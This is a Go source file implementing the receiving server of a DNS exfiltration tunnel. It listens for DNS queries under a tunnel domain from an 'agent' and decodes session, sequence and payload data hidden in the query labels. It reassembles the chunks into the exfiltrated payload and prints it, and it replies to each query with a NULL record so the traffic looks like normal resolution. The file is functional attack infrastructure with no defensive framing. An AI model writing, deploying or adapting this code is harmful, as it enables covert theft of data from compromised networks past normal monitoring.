package dnsexfil

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Server is an authoritative UDP DNS listener that decodes exfil queries.
// It responds to every query with a minimal NULL record (any answer keeps
// the client's resolver happy; the payload lives in the query).
type Server struct {
	Bind    string // e.g. "0.0.0.0:5353"
	Domain  string // the tunnel domain the agent is querying under
	Reasm   *Reassembler
	OnChunk func(sessionID string, seq, total int, payload []byte)

	conn *net.UDPConn
	once sync.Once
}

// Start opens the UDP socket and serves until ctx is cancelled.
func (s *Server) Start(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", s.Bind)
	if err != nil {
		return err
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return err
	}
	s.conn = conn
	log.Printf("[dnsexfil] listening on %s, domain=%s", s.Bind, s.Domain)

	go func() {
		<-ctx.Done()
		s.Stop()
	}()

	buf := make([]byte, 4096)
	for {
		n, client, err := conn.ReadFromUDP(buf)
		if err != nil {
			return nil
		}
		s.handlePacket(buf[:n], client)
	}
}

// Stop closes the listener.
func (s *Server) Stop() {
	s.once.Do(func() {
		if s.conn != nil {
			s.conn.Close()
		}
	})
}

// handlePacket parses one DNS query, extracts the tunnel label, feeds the
// reassembler, and sends a minimal NULL-record response.
func (s *Server) handlePacket(pkt []byte, client *net.UDPAddr) {
	if len(pkt) < 12 {
		return
	}
	txid := pkt[0:2]
	qname, qtype, off := parseQuestion(pkt)
	if qname == "" || off == 0 {
		return
	}
	qname = strings.ToLower(strings.TrimSuffix(qname, "."))

	// The tunnel domain suffix must match.
	suffix := strings.ToLower(s.Domain)
	if !strings.HasSuffix(qname, suffix) {
		return
	}
	label := strings.TrimSuffix(qname, suffix)
	label = strings.TrimSuffix(label, ".")
	if label == "" {
		return
	}

	seq, total, session, payload, err := Decode(label)
	if err != nil {
		// non-tunnel query, ignore
		return
	}
	if s.OnChunk != nil {
		s.OnChunk(session, seq, total, payload)
	}
	if s.Reasm != nil {
		s.Reasm.Feed(session, seq, total, payload)
	}

	// Respond with a minimal NULL record so the client resolver is happy.
	resp := buildNullResponse(pkt, qname, qtype, txid)
	if resp != nil {
		s.conn.WriteToUDP(resp, client)
	}
}

// parseQuestion extracts the qname and qtype from a DNS packet. Returns
// (qname, qtype, offset_after_question).
func parseQuestion(pkt []byte) (string, uint16, int) {
	if len(pkt) < 12 {
		return "", 0, 0
	}
	off := 12
	var parts []string
	for off < len(pkt) {
		l := int(pkt[off])
		if l == 0 {
			off++
			break
		}
		if l&0xC0 != 0 {
			// compression pointer — stop
			return "", 0, 0
		}
		off++
		if off+l > len(pkt) {
			return "", 0, 0
		}
		parts = append(parts, string(pkt[off:off+l]))
		off += l
	}
	if off+4 > len(pkt) {
		return strings.Join(parts, "."), 0, 0
	}
	qtype := uint16(pkt[off])<<8 | uint16(pkt[off+1])
	return strings.Join(parts, "."), qtype, off + 4
}

// buildNullResponse returns a DNS response with one NULL record for the
// queried name.
func buildNullResponse(pkt []byte, qname string, qtype uint16, txid []byte) []byte {
	// Header: txid(2) flags(2)=0x8180 qd(2)=1 an(2)=1 ns(2)=0 ar(2)=0
	hdr := make([]byte, 12)
	copy(hdr[0:2], txid)
	hdr[2] = 0x81
	hdr[3] = 0x80
	hdr[5] = 0x01 // qdcount
	hdr[7] = 0x01 // ancount

	// Encode the question section verbatim by re-parsing position.
	// Simpler: rebuild qname here.
	var q []byte
	for _, part := range strings.Split(qname, ".") {
		if len(part) == 0 {
			continue
		}
		q = append(q, byte(len(part)))
		q = append(q, part...)
	}
	q = append(q, 0)
	q = append(q, byte(qtype>>8), byte(qtype), 0, 1) // qclass IN

	// Answer: name pointer (0xC00C) type NULL(10) class IN(1) ttl(4) rdlen(2)=1 rdata(1)=0
	answer := []byte{
		0xC0, 0x0C, // name pointer to qname
		0x00, 0x0A, // type NULL
		0x00, 0x01, // class IN
		0x00, 0x00, 0x00, 0x3C, // ttl 60
		0x00, 0x01, // rdlength 1
		0x00, // rdata
	}

	out := append(hdr, q...)
	out = append(out, answer...)
	return out
}

// DefaultReassembler builds a reassembler that logs completed payloads.
func DefaultReassembler() *Reassembler {
	r := NewReassembler()
	r.OnComplete = func(sessionID string, payload []byte, bytes int64) {
		fmt.Printf("[dnsexfil] session %s complete: %d bytes\n", sessionID, bytes)
		fmt.Printf("[dnsexfil] payload:\n%s\n", string(payload))
	}
	return r
}

// ensure context import isn't dropped when the caller doesn't use it
var _ = time.Second
